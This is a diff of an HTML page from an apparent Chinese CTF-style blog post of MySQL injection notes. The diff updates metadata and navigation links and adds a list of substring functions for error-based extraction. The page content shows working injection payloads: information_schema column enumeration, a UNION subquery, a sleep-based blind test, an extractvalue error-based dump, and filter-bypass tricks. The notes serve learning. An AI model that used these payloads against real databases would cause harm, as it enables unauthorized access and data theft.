@@ -27,7 +27,7 @@
 <meta property="og:description" content="sql包括：mysql、sqlite、MongoDB、Access等等，语法各有不同，在注入时若出现500错误，可能需要换个语言 以下是mysql注入 流程无列名注入时间盲注报错注入 各种注入方式各种绕过方式 流程: 判断闭合方式：  a. 单引号 ‘  b. 单引号加括号 ‘) (比如有in(USER_INPUT)语句)  c. 数字型：输入1&#x2F;1，是否等于输入1  获取数据库名称:">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-08T04:17:27.701Z">
+<meta property="article:modified_time" content="2025-04-22T03:37:35.903Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          994 字
+          1k 字
         
       </span>
     
@@ -293,7 +293,7 @@
 <ol start="2">
 <li>获取列名</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&lt;&gt;&#x27; and table_name=&#x27;&lt;&gt;&#x27;<br>或者<br>1&#x27;;desc <br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select group_concat(column_name) from information_schema.columns where table_schema=&#x27;&lt;&gt;&#x27; and table_name=&#x27;&lt;&gt;&#x27;<br>或者<br>1&#x27;;desc<br></code></pre></td></tr></table></figure>
 <ol start="3">
 <li>获取数据</li>
 </ol>
@@ -311,7 +311,7 @@
 <h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p><strong>payload</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users) <span class="hljs-keyword">as</span> a<br></code></pre></td></tr></table></figure>
 
-<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>可能用到的函数有<br>mid, substr, </p>
+<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>可能用到的函数有<br>mid, substr,</p>
 <p>比如要猜测一个flag，共3个字符<br>对于第一个字符，遍历所有可能的取值，如果正确，则sleep，根据时间判断是否正确。</p>
 <p>可以先判断如何闭合：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; and select if(1=1,sleep(3),0);<br></code></pre></td></tr></table></figure>
@@ -328,7 +328,15 @@
 <p>例如:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #<br></code></pre></td></tr></table></figure>
 <p>其中0x7e是让路径报错的关键, 且放在concat的第一个位置</p>
-<p>报错最多32个字符,所以如果需要回显的字符数量超过32,则需要用到substr来分批次得到结果.</p>
+<p>报错最多32个字符,所以如果需要回显的字符数量超过32,则需要用到substr来分批次得到结果.<br>截取结果可用函数</p>
+<ul>
+<li>substr(str, pos [, length])</li>
+<li>left</li>
+<li>right</li>
+<li>TRIM([{BOTH|LEADING|TRAILING} [substr] FROM] str)  </li>
+<li>reverse(str)</li>
+<li>insert(str, pos, end, replaced_str)  # 把从pos开始到end结束的字符串替换成replaced_str</li>
+</ul>
 <h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ol>
 <li>过滤等号 —&gt; like</li>
 <li>过滤空格 —&gt; 括号</li>
@@ -411,9 +419,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/flask/python%20session%E4%BC%AA%E9%80%A0/" title="flask session伪造">
+                      <a href="/blogs/sql/sql%E7%BB%95%E8%BF%87/" title="sql注入绕过">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">flask session伪造</span>
+                        <span class="hidden-mobile">sql注入绕过</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -421,8 +429,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/sql/sql%E7%BB%95%E8%BF%87/" title="sql注入绕过">
-                        <span class="hidden-mobile">sql注入绕过</span>
+                      <a href="/blogs/xss/xss/" title="xss">
+                        <span class="hidden-mobile">xss</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
